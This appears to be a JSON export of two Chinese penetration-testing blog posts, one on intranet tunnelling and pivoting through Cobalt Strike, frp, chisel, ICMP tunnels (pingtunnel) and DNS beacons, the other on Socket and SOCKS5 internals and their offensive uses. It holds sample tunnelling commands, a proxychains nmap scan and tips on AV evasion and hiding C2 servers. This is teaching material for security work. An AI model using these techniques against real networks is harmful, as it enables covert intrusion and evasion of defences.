[{"title":"内网穿透","path":"/2025/08/03/内网穿透/","content":"[TOC] 摘要内网穿透（NAT穿透）是指在无法直接访问内网主机的情况下，通过一定的技术手段，让外部网络能够访问内网中的设备或服务。它常用于远程办公、内网渗透测试、远程维护、搭建内网服务等场景。这篇文章我们会从内网渗透测试的角度来讲解一下内网穿透的利用。（文章大部分是文字，总体比较枯燥，也不是很好理解，建议先看一下b站上小迪渗透中关于内网穿透的讲解视频) 内网穿透为什么需要内网穿透在进行内网渗透时，当我们拿下入口机后，通常需要进行横向移动。这一过程中，首先要进行信息收集，并利用相应漏洞控制更多主机，这就需要与其他主机建立通信。然而，目标主机往往与我们的攻击机不在同一网段，无法直接通信。 一种常见做法是将工具上传到入口机，通过入口机继续横向渗透。但这种方式存在诸多不便：许多工具图形化操作更为直观，上传后只能通过命令行操作，查看和下载命令执行结果也不够方便；如果文件较大，上传难度增加；在真实环境中，上传和使用工具会留下较多痕迹，增加清理难度；有些工具还需要免杀处理，操作繁琐。 因此，实际渗透中我们更倾向于在被控主机上建立代理节点或进行端口转发，这样就可以在本地直接利用各种工具进行通信和攻击，既方便又隐蔽。 此外，在横向移动过程中，还可能遇到防火墙策略限制，常规 HTTP 协议无法通信。如果是出入都受到限制，这时，我们可以选择使用其他协议（如 ICMP、DNS 等）建立隧道，实现通信穿透。 常见的内网穿透方式正反向连接原理从实用角度来看，这种方式本身并不能算作真正的内网穿透手段，更多情况下是与其他方法配合使用。 在防火墙防护中，通常会区分入站和出站规则，两者的限制策略往往不同。一般来说，入站规则会比出站规则更为严格，因为让对方主动连接我们通常需要更高的权限，而我们主动访问对方则相对容易。当然，这并不是绝对的，具体还要根据目标环境的业务需求和实际配置来判断。 通常，入口机位于边界区域（如DMZ），具备访问外网的能力。此时，防火墙对入站流量的检测较为严格，而对出站流量的限制则相对宽松。而对于完全处于内网的主机，往往只允许与同一网段的其他主机通信，无法直接反弹连接到外网的攻击机。 在这种情况下，我们需要借助入口机作为中转。如果目标主机无法直接反向连接到外网C2服务器，可以让目标主机监听本地端口，然后通过入口机发起连接，实现会话转发。这样既能突破内网隔离，又能将会话最终集成到我们的 C2 平台中，便于后续统一管理和操作。 当然，我们也可以建立两个反向连接，一个是目标机器反向连接入口机，一个是入口机再反向连接到 C2 服务器，这样也能够将会话最终集成到我们的 C2 平台中。 因此，我们需要根据目标的防护策略选择合适的后门连接方式。这可以通过信息收集来判断：通常会先尝试让目标主机连接我们的攻击机，如果可以连通，就优先选择反向连接；如果无法连通，再考虑正向连接等其他方式。 另外还需要注意的是，本地的攻击机通常没有设置防护规则，但在内网环境中进行横向移动时，拿下目标机器后，就需要同时考虑攻击机和目标机器的防护策略。要明确在不同场景下，哪台主机是“入站”，哪台主机是“出站”，以避免因受控机器的防护策略导致连接失败。当然，也可以选择直接关闭受控机器上的防护策略，但一般不建议这样做，因为这可能会影响正常业务的运行。 使用我们可以使用 Cobalt Strike（CS）和 Metasploit（MSF）生成相应的监听器，并创建对应的后门程序，随后在目标机器上执行这些后门，从而获取与目标主机的会话。CS 和 MSF 都支持多种监听器类型，包括正向连接和反向连接。当然，也可以通过手动命令实现正反向连接。 但在真实的渗透测试环境中，建议优先使用各类 C2 工具，因为它们不仅便于管理会话，还集成了丰富的后渗透功能，有助于后续的深入渗透和横向移动，提高整体效率和隐蔽性。 建立 SOCKS 代理原理在实际的内网渗透过程中，所谓的“建立SOCKS节点”，通常是指在我们的攻击服务器（C2服务端）上开启SOCKS代理服务。入口机本身并不直接作为SOCKS代理节点，而是通过与攻击服务器之间建立的通信通道（如Beacon、隧道、端口转发等）实现流量的转发。 当我们本地工具访问攻击服务器上的 SOCKS 代理端口时，攻击服务器会将这些流量通过与入口机之间的隧道或会话进行转换和转发，由入口机再去访问内网其他主机。这样，我们就可以在本地实现对内网资源的探测和利用，入口机实际上起到了“流量中转站”或“跳板”的作用。 由于 SOCKS 协议能够代理任意的 TCP&#x2F;UDP 流量，而绝大多数应用协议都是基于这两种协议实现的，因此我们可以通过 SOCKS 代理转发几乎所有类型的网络流量。 实际上，在大多数情况下，我们使用 SOCKS 代理并不是为了绕过防火墙策略，而是因为内网通信的特殊性。很多时候，本地攻击机无法直接访问内网中的其他主机。如果我们希望在本地直接使用各种工具对内网其他主机进行探测和攻击，就需要先在入口机上搭建 SOCKS 代理节点，通过入口机实现与内网其他主机的通信。 关于 SOCKS 协议的更多内容可以参考我上篇文章Socket和SOCKS介绍。 使用如果使用 C2 工具，我们可以直接在对应的会话上建立代理转发，然后在本地再配置一个 SOCKS 代理转发节点。对于本地代理转发工具，Windows 推荐使用 Proxifier，Linux 推荐使用 Proxychains。 需要明确的是，这里实际上涉及两个代理节点：一个代理节点建立在 C2 工具服务器上，通常由 C2 工具自身实现，用于接收、解析并转发流量到被控主机；另一个代理节点建立在攻击者本地，负责将本地工具的流量封装并转发到 C2 服务器上的SOCKS代理。这样配合使用，可以实现本地对内网目标的透明访问和操作。 我们这里以 Cobalt Strike（CS） 为例来梳理一下整个流程： 在CS的会话上建立SOCKS代理：这一步会在 CS 的服务端上监听一个 SOCKS 端口（如1080）。 本地工具配置SOCKS代理：你在本地（CS 客户端）的浏览器、proxychains等工具中，将代理设置为 CS 服务端监听的 SOCKS 端口。 流量转发过程：你本地工具的流量会被包装成 SOCKS 协议，发送到 CS 服务端监听端口（即CS的SOCKS代理端口）。 CS服务器处理：CS 服务端接收到SOCKS流量后，解析协议内容，并通过与入口机（被控主机&#x2F;Beacon）的通信通道，将流量转发到目标内网主机。 实现内网操作：入口机收到流量后，代表你去访问或操作内网其他主机，并将结果通过同样的路径返回给你的本地工具。 端口转发原理端口转发是指将本地或远程某个端口收到的数据流量，自动转发到另一台主机的指定端口，实现不同网络之间的通信桥接。这样，外部主机可以通过访问转发端口，间接访问内网或受保护主机上的服务。 端口转发和 SOCKS 代理一样，前提都是攻击服务器与入口机之间已经建立了通信通道。端口转发的本质是：当我们访问攻击服务器的某个映射端口时，攻击服务器会将流量通过已建立的通道转发到受控机上的指定目标（ip:port，内网其他主机对应的ip和port）。 与 SOCKS 代理相比，端口转发是一对一的关系——每次只能将一个端口映射到一个目标。而 SOCKS 代理是一对多的关系——通过访问攻击服务器上的 SOCKS 代理端口，可以访问任意目标和端口。防火墙绕过方面，两者本质上受到的限制类似，主要区别在于协议支持：SOCKS 代理支持多种协议，而端口转发只能转发指定协议的流量。（但是在小迪渗透的视频中，这两者好像是针对出入站有不一样的运用情况，这里看得不是很懂，按照我的理解在绕过防护方面没有什么太大的区别，受到的限制除了协议以外，基本是一致的。） 使用我查阅了一些资料，发现有说法称 Cobalt Strike（CS）可以通过 portfwd 命令实现端口转发，但实际操作时发现并不可用，在客户端界面也没有找到相关功能。不知道，其他 C2 工具是否支持端口转发功能。 所以我们这里推荐使用以下三款工具：frp、nps 和 **chisel**。他们是实现内网穿透的，并不是 C2 工具。 frp 和 nps 都有服务端和客户端两个执行文件，frp 和 chisel 主要通过命令行和配置文件操作，稍显繁琐；nps 支持通过浏览器访问 Web 服务端进行管理，操作更为简便。 chisel 只有一个可执行文件，既可作为服务端，也可作为客户端，部署更灵活。 在实际使用中，通常在攻击服务器上运行服务端，在入口机（跳板机）上运行客户端，因此需要将客户端文件上传到入口机执行。 frp 和 nps 是较为知名的端口转发工具，查杀较多；chisel 功能强大且相对小众，免杀处理更容易，这也是推荐它的原因。当然，随着安全对抗的变化，掌握自研工具的能力会更有优势。 这三款工具均支持 SOCKS 代理和端口转发，具体用法可参考官方文档或小迪渗透测试视频。 端口转发的主要目的是让我们能够在本地访问内网资源，便于信息收集和后续渗透。同时，端口转发也可以用于隐藏 C2 服务端的位置。通常情况下，C2 服务端部署在公网服务器上，容易被溯源和干扰。为提升隐蔽性，可以将 C2 服务端部署在本地虚拟机或内网主机上，通过端口转发将公网服务器的端口映射到内网 C2 服务端，实现“跳板”效果。 具体做法是： 在公网服务器上运行端口转发服务，将指定端口流量转发到内网或虚拟机中的 C2 服务端。 C2 客户端可配置两个监听器：一个用于生成连接公网服务器的后门，另一个监听本地或内网连接。 这样，目标主机先连接公网服务器，再通过端口转发进入内网 C2 服务端，提升了隐蔽性和安全性。 如果 C2 服务端本身在公网服务器上，面对受限内网环境时，也可以通过入口机（跳板机）实现类似的端口转发，帮助其他主机上线。 建立隧道代理原理前面三种方法主要还是解决的内网通信问题。而隧道代理则主要是为了解决防火墙问题。 隧道代理（Tunneling Proxy）是一种通过在两个网络节点之间建立“隧道”，将原本无法直接传递的数据流封装后转发，实现跨越网络隔离或防火墙访问目标资源的技术。 原理简述如下： 数据封装隧道代理会把原始数据流（如 HTTP、RDP、SSH 等）封装在另一种协议的数据包中（如 TCP、HTTP、HTTPS、SSH、VPN 协议等），使其能够穿越受限网络或防火墙。 隧道建立客户端与代理服务器之间建立一条“隧道”连接。所有需要转发的数据都通过这条隧道传输，外部网络只看到隧道协议的数据流，而看不到真实内容。 数据转发 代理服务器接收到封装的数据后，解包还原成原始数据，再转发到目标主机。目标主机的响应同样经过代理服务器封装后返回客户端。 隧道中根据协议的不同，有 ICMP、DNS、SMB 等隧道，包括我们前面提到的 SOCKS 代理也是隧道代理实现的一种，但他会和前面几种区分开来。我们这里简单做个比较： 对比项 SOCKS 隧道 DNS 隧道 ICMP 隧道 协议层次 会话层&#x2F;应用层（基于TCP&#x2F;UDP） 应用层（基于DNS协议，UDP 53端口为主） 网络层（基于ICMP协议，如ping包） 数据封装方式 直接转发原始数据，无特殊封装 数据编码后嵌入DNS查询&#x2F;响应 数据编码后嵌入ICMP请求&#x2F;响应负载 适用场景 高带宽代理、常规流量转发 绕过防火墙、低带宽隐蔽通信 极端隔离环境下的隐蔽通信、低带宽传输 带宽&#x2F;效率 高，适合大流量 低，受DNS包大小限制 低，受ICMP包大小限制 隐蔽性 一般，易被检测 高，流量伪装性强 高，流量伪装性强 工具支持 丰富（Shadowsocks、Proxychains、chisel等） 需专用工具（iodine、dnscat2、Heyoka等） 需专用工具（icmptunnel、pingtunnel等） 配置复杂度 低，配置简单 中，需专用服务端和客户端 中，需专用服务端和客户端 防火墙穿透能力 一般，依赖端口开放 强，利用DNS端口常被放行 强，利用ICMP常被放行 检测难度 易被IDS&#x2F;防火墙检测 需流量分析，检测难度较高 需流量分析，检测难度较高 典型用途 代理上网、内网渗透 绕过审查、隐蔽通信、命令控制 隐蔽通信、极端环境下的数据回传 总的来说，SOCKS 代理只是转发了连接数据，如果对方内网中阻止了 TCP 或 UDP 通信，那么我们只能使用DNS，ICMP等隧道代理。如果 TCP 和 UDP 都被阻止了，那么 DNS 隧道也无法使用了。 使用我们建立隧道的主要目的是在本地访问内网资源，利用本地工具进行信息收集。如果能让目标主机上线到 C2 服务器（如 Cobalt Strike），则可以统一管理受控主机，并直接利用 C2 工具的各种功能。 但这涉及一个关键问题：C2 工具内置的监听器类型是否支持我们所建立的隧道协议。 以 SOCKS 隧道为例，SOCKS 服务通常部署在 C2 服务器端，C2 能够解析和转发 SOCKS 流量。我们与入口机之间的通信依然是常规的 TCP&#x2F;UDP 流量，因此可以通过 C2 的 HTTP&#x2F;HTTPS&#x2F;TCP 等监听器进行隧道通信。 但如果我们建立的是 ICMP 隧道，为了绕过防火墙，进出流量都被封装成 ICMP 数据包。此时，C2 服务器（如 CS）如果没有支持 ICMP 的监听器，就无法直接接收和解析 ICMP 流量，目标主机也无法直接上线到 C2。 解决方法有两种： 自行开发或扩展 C2 工具，增加对 ICMP（或其他特殊协议）监听器的支持，使其能直接接收和解析 ICMP 流量。 在 ICMP 隧道服务端实现协议转换，将接收到的 ICMP 数据解包后转发为 C2 支持的协议（如 TCP），并将 C2 返回的数据再封装为 ICMP，通过隧道传回入口机。这样，C2 只需监听常规端口，协议转换由隧道工具完成。 CS 支持自定义监听器类型，网上也有现成的协议转换工具可用，我们也可以自己实现。 ICMP我们这里借助 CS 和 pingtunnel 来演示第二种方式建立 ICMP 隧道并上线到 C2 服务端。我们这里一个是自己真实的 win10 主机充当 CS 客户端，kali 虚拟机 充当 CS 服务端，以及一个 win10 虚拟机充当入口机。这里我们需要分别下载 pingtunnel 的windows 和 linux 版本。其中 windows 版本放在 win10 虚拟机上作为客户端，linux 版本放在kali 虚拟机充当服务端。 我们先在 kali 上启动 CS 服务端，然后我们本地启动 CS 客户端进行连接。 之后，我们再在 kali 上启动 pingtunnel 的服务端，运行命令为./pingtunnel -type server ： 随后，我们在 win10 虚拟机上一管理员身份运行 pingtunnel 的客户端，命令为pingtunnel -type client -l :6666 -s 192.168.161.128 -t 192.168.161.128:7777 -tcp 1 -noprint 1 -nolog 1，这里是连接服务端，然后监听本地 6666 端口的流量，然后将本地端口的流量转发给服务端的7777端口。 然后，我们查看 kali 服务端，可以发现收到了客户端的连接。可以看到ping from 192.168.161.200的信息。 我们还需要在本地 CS 的客户端生成两个监听器。 可以看到第一个是连接到本地的 6666 端口，第二个是连接到 192.168.161.128（kali）的 7777 端口。我们使用第一个监听器生成对应的 exe 文件，放到 win10 虚拟机上面运行，因为 pingtunnel 客户端在运行，他就会将监听到的 6666 端口的流量转发到服务端（192.168.161.128）的 7777 端口。又因为我们第二个监听器就是监听的 CS 服务端（192.168.161.128）7777 端口，所以这里成功上线了。 跟我们前面端口转发那里讲解得一致，这里也是一个监听器负责生成后门，一个负责进行监听连接。 最后，我们通过上线的会话来执行ipconfig命令来查看是否上线的是 win10 虚拟机。 可以看到没有问题（192.168.161.200）。 我们这里如果不需要上线的话，在连接到 pingtunnel 服务端时，我们还需要借助其他工具来实现流量转发。我们需要在 win10 虚拟机建立一个本地 SOCKS 代理（6666端口，将访问到 win10 虚拟机的流量转发到监听的6666端口），因为这里只是对6666端口的流量进行了监听和转发，如果我们访问的不是6666端口，这个时候就接收不到流量；同样，我们需要在 kali 虚拟机上也进行流量的监听和转发，我们这里可以将7777端口的流量转发到8888端口，然后我们本地物理机 win10 再通过 proxifier 设置一个 SOCKS 代理，在我们访问 win10 虚拟机相关资源时，将流量转发到 kali 虚拟机的8888端口。我们这里推荐一个工具来实现上面提到的代理和转发——iox。 这里配置起来还是比较繁琐，有点绕。借助这种方法，我们也可以通过入口机访问其他主机资源，在常规 SOCKS 代理受到了防火墙的限制时。 DNSCS 是支持 DNS 协议的监听器的。所以我们这里可以不用借助其他工具或者自己实现监听器。 首先，申请一个域名（如 www.test.com），并购买一个公网IP。 在域名管理后台，将 www.test.com 的A记录指向你的公网IP。 创建一条 NS 记录，将子域名（如 a.test.com）指向 www.test.com。可以多配置几条 NS 记录（如 b.test.com 也指向 www.test.com），以提升可用性和冗余，防止单一域名失效。 在 Cobalt Strike（CS）中，配置监听器时，使用你已配置的域名（a.test.com、b.test.com）作为监听器的主机名（Host），这样即使某个域名被封，其他域名仍可用，提升隐蔽性和生存能力。 最后，我们生成对应的后面，上传到目标机器并执行，即可实现 C2 上线。 在上线2之后，我们前面也提到了 DNS 带宽很低，所以回显比较慢，我们这里想要提升速度的话，还需要先后执行两条命令checkin，mode dns-txt。 如果我们只是单纯想要实现 DNS 隧道的话，那么我们这里可能还需要借助其他工具，这里推荐使用dnscat2，这里就不再演示了。 还有很多其他隧道，如 SSH，SMB，IPV6 等，原理和使用方法基本和 ICMP，DNS 一致，只不过可能存在着一些细小差异。这三种相比于前面两种适用性没有那么强，我们这里就不演示这三种隧道了，遇到需要搭建隧道时，优先考虑前两种。 小结内网穿透涉及的知识点较多，关键在于理解不同方法适用的环境和对应的协议类型。 SOCKS 代理和端口转发主要用于解决网络通信问题，适用于 TCP&#x2F;UDP 协议。 正向&#x2F;反向连接和隧道代理则更侧重于绕过防火墙限制，支持多种协议，具体选择需根据防火墙策略灵活调整。 我们可以通过已获取的权限，在目标主机上执行如下命令，判断哪些协议和端口可用： 123456ICMP：ping ip 或域名HTTP：curl ip 或域名SSH：ssh ip 或域名DNS：nslookup 域名TCP：telnet ip 端口... 需要注意，本文讨论的方法主要针对“已拿到部分权限但通信受阻”的场景。 在分析防火墙策略时，要特别区分是出站、入站，还是双向都有限制。 各种方法并非孤立存在，可以灵活组合使用，以绕过更严格的防护，实现复杂的通信需求。 总之我们应根据实际收集到的通信情况、防护策略和渗透目标，灵活选择或组合不同的内网穿透方法。因此，深入理解每种方法的特性和适用场景非常重要。 最后，由于本人才疏学浅，再加上文章中不少场景本人也没有进行过相关实验，所以可能会存在不少错误问题。这里建议还是以实际情况为主，希望大家能多多进行实际验证，最好是针对每个实验能够使用 Wireshark 抓取一下具体通信协议。 参考文章 references: 小迪渗透测试视频通信隧道等","tags":["隧道","代理"],"categories":["内网"]},{"title":"Socket和SOCKS介绍","path":"/2025/07/30/Socket和SOCKS介绍/","content":"[TOC] 摘要在渗透测试和网络安全领域，我们经常会遇到SOCKS协议和Socket编程这两个概念。许多代理工具不仅支持HTTP协议，还提供SOCKS协议支持；在内网渗透过程中，我们也频繁使用SOCKS来建立稳定的代理隧道；而在开发自定义服务器或探测工具时，Socket编程更是不可或缺的基础技术。 本文将解析这两个重要概念的技术原理，探讨它们之间的内在联系，并从安全攻防的实战角度分析它们如何帮助我们提升渗透测试效果和工具开发能力。 Socket（套接字）本质Socket 不是协议，而是编程接口。位于应用层和传输层之间的抽象层，是操作系统提供的API接口，不属于特定的网络层，可以使用来实现各种协议（HTTP，FTP，SMTP等）。 在一些技术文章中，经常会将Socket描述为”文件系统中的一种特殊文件类型”，但这种说法容易产生误解。实际上，这只是Unix域Socket在文件系统中的一种表现形式，体现了Unix&#x2F;Linux系统”一切皆文件“的经典设计理念。 需要明确的是，Socket本质上就是一套编程接口（API），而非真正意义上的文件。当我们说Socket是”特殊文件类型”时，指的是Unix域套接字在文件系统中会创建一个可见的文件节点，通过文件路径进行标识和访问。这种设计让进程间通信能够复用文件系统的管理机制，但Socket的核心功能依然是提供进程间通信的编程抽象。 因此，准确的理解应该是：Socket是编程接口，而”文件类型”只是其在特定场景下（Unix域套接字）的系统表现形式。这种设计既保持了接口的统一性，又充分利用了Unix系统的文件管理优势。 作用Sokcet是实现进程之间通信的核心技术。Socket通信主要分为两大类：本地进程通信和网络进程通信。 网络进程通信通过IP地址、通信协议和端口号的组合来进行区分和标识，形成网络五元组（协议、本地IP、本地端口、远程IP、远程端口）。在系统层面，网络Socket表现为内核内存中的数据结构，通过文件描述符进行访问和操作。 本地进程通信则根据进程PID来区分不同的进程，使用Unix域套接字来实现。Unix域套接字是操作系统文件系统中的一种特殊文件类型，通过文件路径进行标识（如/tmp/app.sock）。这种方式不依赖网络协议栈，通信效率更高，常用于同一主机内的进程间数据交换。 使用Socket建立客户端与服务端通信的核心在于协议栈的分层协作。Socket作为编程接口，抽象了底层协议栈的复杂性，使开发者可以方便地通过网络传输数据。以下是详细的协议栈层次和Socket在其中扮演的角色。 Socket通信依赖的协议栈通常基于TCP&#x2F;IP模型（实际是OSI模型的简化版），分为以下关键层次： 层级 协议示例 功能描述 Socket的作用 应用层 HTTP、FTP、WebSocket等 处理具体应用逻辑（如浏览器请求网页、文件传输）。 Socket提供send()&#x2F;recv()等接口。 传输层 TCP、UDP 确保可靠传输（TCP）或快速无连接传输（UDP），管理端口号和数据分段。 Socket绑定端口，选择TCP&#x2F;UDP传输方式。 网络层 IP、ICMP 负责寻址和路由（通过IP地址将数据包从源主机发送到目标主机）。 Socket封装源&#x2F;目标IP地址。 链路层 Ethernet、Wi-Fi 物理设备间的数据帧传输（如网卡驱动、MAC地址）。 由操作系统和硬件处理，对Socket透明。 物理层 光纤、双绞线 实际比特流的传输媒介。 完全硬件实现。 各个编程语言对于 Socket 的操作最终都是依赖操作系统 API，区别在于封装层次和抽象方法。我们常用的一些接口方法如下： 适用场景Socket 和高级封装库（如 Python 的 requests）都能实现网络通信，但它们的抽象层级、灵活性和易用性有显著差异。以下是两者的对比分析： 1. 核心区别 特性 Socket（底层） requests（高级封装） 抽象层级 直接操作传输层（TCP&#x2F;UDP）和网络层（IP）。 封装HTTP协议（应用层），隐藏底层细节。 协议支持 可自定义任何协议（如TCP&#x2F;UDP&#x2F;WebSocket）。 仅支持HTTP&#x2F;HTTPS。 控制粒度 精细控制（如数据分片、超时重试策略）。 黑箱操作，依赖库的默认实现。 开发复杂度 高（需手动处理协议细节、错误恢复）。 极低（一行代码完成HTTP请求）。 性能优化空间 可优化底层（如连接复用、零拷贝）。 受限于库的实现（如requests同步阻塞）。 2. 优缺点对比(1) Socket 的优缺点 优点： 灵活性强：可自定义协议（如实现私有RPC协议或游戏通信协议）。 性能可控：能优化底层细节（如非阻塞IO、多路复用）。 无依赖：不限于HTTP，适合非标准协议场景（如物联网设备通信）。 缺点： 开发成本高：需手动处理协议格式、粘包拆包、错误重试等。 易出错：容易因底层细节（如字节序、TCP拥塞控制）引入Bug。 维护困难：协议变更需修改代码，兼容性差。 (2) requests 的优缺点 优点： 简单易用：一行代码完成HTTP请求，自动处理编码、Cookies等。 功能完善：内置连接池、重试、SSL验证等。 生态丰富：与JSON解析、OAuth等工具链无缝集成。 缺点： 灵活性差：无法修改HTTP以外的协议（如不能直接发UDP包）。 黑箱操作：难以优化底层性能（如无法控制TCP握手超时时间）。 性能瓶颈：同步阻塞模型（可用aiohttp等库解决异步需求）。 3. 典型场景选择适合用 Socket 的场景： 需要自定义协议（如实时游戏、物联网设备通信）。 高性能需求（如高频交易系统，需零拷贝或RDMA）。 底层网络研究（如实现TCP拥塞控制算法）。 适合用 requests 的场景： 快速开发RESTful API客户端。 爬虫或数据采集（需处理Cookies、Session）。 与现有HTTP生态（如OAuth、OpenAPI）集成。 4. 演进关系 requests 的本质：在Socket基础上封装了HTTP协议（应用层），类似的其他库： aiohttp：基于Socket的异步HTTP客户端。 websockets：基于Socket的WebSocket协议实现。 所有高级库最终都调用Socket：例如requests的底层依赖链：requests → urllib3 → http.client → socket 在安全中的利用经过前面的讲解，特别是与高级封装库（如 requests）的对比，相信大家已经能够体会到 Socket 在安全测试中的独特优势。 Socket 更加抽象且接近底层，能够直接操作应用层以下的多种协议，因此在安全测试中具有极高的灵活性。例如： 端口探测：可以通过 Socket 直接连接目标端口，判断服务是否开放。即使目标未开放 HTTP 协议，也可以利用 ICMP、ARP 等协议进行探测。我们还可以使用 ICMP 和 ARP 协议来探测目标主机是否存活。(这些就是 namp 的核心实现原理之一) 数据通道建立：在内网渗透过程中，Socket 可用于绕过防火墙策略限制，如建立 ICMP 或 DNS 数据通道。由于防火墙通常不会拦截这些协议（如 ping 命令依赖的 ICMP 协议），攻击者可以借此实现隐蔽通信。 协议操控与绕过检测：通过精细控制协议数据包内容，攻击者可以绕过部分安全过滤机制，甚至自定义协议以增强隐蔽性。 网络欺骗攻击：Socket 还可以用于实施 DNS 劫持、ARP 欺骗等攻击，进一步扩大攻击面。 内网横向移动：Socket 可用于开发各类内网渗透工具，实现端口转发、代理隧道、远程命令执行等功能，帮助攻击者在内网中灵活穿透隔离、横向移动至更多目标主机。 总之，Socket 提供了对应用层以下协议的直接操控能力，极大提升了攻击的灵活性和渗透能力，扩大了我们的攻击面。如果我们想要自己写一些渗透测试的工具，特别是和进程通信相关的，那么 Socket 的学习和掌握是必不可少的。 SOCKSSOCKS（Socket Secure）是一种网络代理协议，用于在客户端和服务器之间通过中间代理服务器转发网络数据。它工作在 OSI 模型的第5层（会话层），可以代理 TCP 和 UDP 流量，广泛应用于绕过防火墙、匿名访问和内网穿透等场景。 1. SOCKS 协议版本SOCKS 主要有两个版本： SOCKS4：仅支持 TCP 连接，无认证机制，不支持域名解析（客户端必须提供目标 IP）。 SOCKS5（RFC 1928）：扩展支持 UDP、认证机制（如用户名&#x2F;密码）、IPv6 和域名解析（客户端可直接发送域名）。 2. SOCKS5 协议工作流程SOCKS5 的通信分为 协商阶段 和 请求阶段： （1）协商阶段（认证协商） 客户端与 SOCKS5 代理服务器建立 TCP 连接后，首先进行认证协商： 客户端发送支持的认证方法（1字节版本 + N 字节方法列表）： 12345+----+----------+----------+|VER | NMETHODS | METHODS |+----+----------+----------+|0x05| 0x01 | 0x00 | # 0x00 = 无认证+----+----------+----------+ VER &#x3D; 0x05（SOCKS5 版本） NMETHODS &#x3D; 支持的认证方法数量（如 0x01 表示 1 种方法） METHODS &#x3D; 认证方式（0x00 无认证，0x02 用户名&#x2F;密码） 服务端返回选中的认证方法： 12345+----+--------+|VER | METHOD |+----+--------+|0x05| 0x00 | # 服务端选择无认证+----+--------+ 如果返回 0xFF，表示无匹配方法，连接终止。 （2）请求阶段（建立代理连接） 认证通过后，客户端发送代理请求： 客户端发送请求（目标地址类型：IP&#x2F;域名&#x2F;IPv6）： 12345+----+-----+-------+------+----------+----------+|VER | CMD | RSV | ATYP | DST.ADDR | DST.PORT |+----+-----+-------+------+----------+----------+|0x05|0x01 | 0x00 | 0x03 | &quot;google&quot; | 0x01BB |+----+-----+-------+------+----------+----------+ VER &#x3D; 0x05（SOCKS5 版本） CMD &#x3D; 0x01（CONNECT，建立 TCP 连接） RSV &#x3D; 保留字段（0x00） ATYP &#x3D; 地址类型： 0x01 &#x3D; IPv4 0x03 &#x3D; 域名（DST.ADDR 第一个字节是长度） 0x04 &#x3D; IPv6 DST.ADDR &#x3D; 目标地址（如 &quot;google.com&quot;） DST.PORT &#x3D; 目标端口（如 443 &#x3D; 0x01BB） 服务端返回响应： 12345+----+-----+-------+------+----------+----------+|VER | REP | RSV | ATYP | BND.ADDR | BND.PORT |+----+-----+-------+------+----------+----------+|0x05|0x00 | 0x00 | 0x01 | 0x7F000001 | 0x1080 |+----+-----+-------+------+----------+----------+ REP &#x3D; 响应码（0x00 成功，0x05 连接拒绝等） BND.ADDR 和 BND.PORT &#x3D; 代理服务器绑定的地址和端口（通常可忽略） 3. SOCKS vs HTTP 代理 特性 SOCKS5 代理 HTTP 代理 协议层级 会话层（第5层） 应用层（第7层） 支持协议 TCP &#x2F; UDP 仅 HTTP&#x2F;HTTPS 性能 更低延迟 可能有额外解析开销 灵活性 可代理任意流量 仅限 Web 流量 认证 支持多种认证方式 通常仅 Basic Auth 4. SOCKS 在安全领域的核心利用方式（1）绕过防火墙与网络审查为什么能绕过？ 协议无关性：SOCKS5 不依赖 HTTP 协议，可以代理任意流量（如 SSH、RDP、DNS、ICMP 隧道）。 低检测率：企业防火墙通常只深度检测 HTTP&#x2F;HTTPS，而 SOCKS 流量可能被当作普通 TCP&#x2F;UDP 连接放行。 支持 UDP：可用于 DNS 隧道、VoIP 通信等，绕过传统防火墙的 TCP 过滤。 典型利用方式： 使用 ssh -D 建立 SOCKS5 隧道访问被封锁的内网服务。 通过 Tor 网络（基于 SOCKS5）匿名访问暗网或规避审查。 （2）内网渗透与横向移动为什么能用于内网渗透？ 穿透性强：SOCKS5 可以代理内网未暴露的服务（如数据库、SMB）。 支持动态端口绑定：攻击者可通过 SOCKS 代理直接访问内网任意端口，无需额外端口转发。 典型利用方式： 通过漏洞（如 Web RCE）在目标机器部署 SOCKS5 代理（如 EarthWorm）。 使用 Proxychains 让所有工具流量走 SOCKS 代理，扫描&#x2F;攻击内网： 1proxychains nmap -sT 192.168.1.0/24 （3）数据外带（C2 通信）为什么适合数据外带？ 隐蔽性高：SOCKS 流量不像 HTTP 有固定特征，可伪装成正常代理流量。 支持多协议：可通过 DNS over SOCKS、ICMP 隧道等绕过流量审计。 典型利用方式： C2 框架（如 Cobalt Strike）通过 SOCKS5 代理回传数据。 使用 dnscat2 通过 SOCKS5 代理建立 DNS 隧道外带数据。 （4）身份隐藏与匿名攻击为什么能隐藏身份？ 多层跳板：攻击者可链式使用多个 SOCKS5 代理（如 Tor → 商业代理 → 私有 VPS）。 无协议特征：不像 HTTP 代理会携带 X-Forwarded-For 等头信息。 典型利用方式： 通过 Proxifier 强制所有应用流量走 SOCKS5 代理。 结合 Tor + SOCKS5 实现高匿名性攻击。 5. SOCKS 协议的安全利用原理协议设计优势 特性 安全利用价值 协议无关性 可代理任意流量（如 RDP、数据库、自定义协议），绕过应用层检测。 支持 UDP 可用于 DNS 隧道、ICMP 封装，绕过仅检测 TCP 的防火墙。 无固定特征 不像 HTTP 代理有固定 Header，更难被 WAF&#x2F;IDS 识别。 动态端口绑定 攻击者无需提前知道内网端口，通过 SOCKS 动态访问任意服务。 有些人可能会疑惑，SOCKS 协议属于会话层（第五层），而 DNS 却是应用层（第七层）协议，为什么 SOCKS 可以用来建立 DNS 隧道？其实，这是因为 SOCKS 能够代理任意的 TCP 或 UDP 流量，而 DNS 本质上就是基于 UDP（有时也用 TCP）进行通信的。SOCKS 代理并不关心上层应用协议的具体内容，它只负责封装和转发数据包，因此可以有效代理包括 DNS 在内的各种应用层请求，实现如 DNS 隧道等特殊用途。 这也解释了为什么在一些代理工具和机场服务中，SOCKS 和 HTTP&#x2F;HTTPS 代理的选择会有区别。选择 HTTP&#x2F;HTTPS 代理时，只能转发 HTTP&#x2F;HTTPS 协议的数据流；而使用 SOCKS 代理，则可以转发所有基于 TCP 或 UDP 的流量，不局限于 HTTP&#x2F;HTTPS，还包括 DNS、FTP、SMTP 等其他协议的数据。 正因为 SOCKS 协议能够直接操作会话层流量，不受应用层协议的限制，且没有固定特征、支持动态端口和多级跳板等功能，使其在安全领域被称为“瑞士军刀”，成为渗透测试和匿名通信等场景中的重要工具。 两者的区别SOCKS 和 Socket 是网络通信中两个密切相关但层次不同的概念： 1. 概念区别 Socket是一种网络编程接口（API），为应用程序提供访问网络协议栈的能力。通过 Socket，开发者可以实现进程间通信，包括本地通信（Unix Socket）和网络通信（TCP&#x2F;UDP Socket）。Socket 更加底层和通用，允许开发者自定义和控制各种协议的数据包内容。 SOCKS是一种代理协议，工作在会话层，允许客户端通过代理服务器转发 TCP&#x2F;UDP 流量。SOCKS 协议本身就是基于 Socket 实现的，代理服务器和客户端之间的通信、数据转发等，底层都依赖 Socket 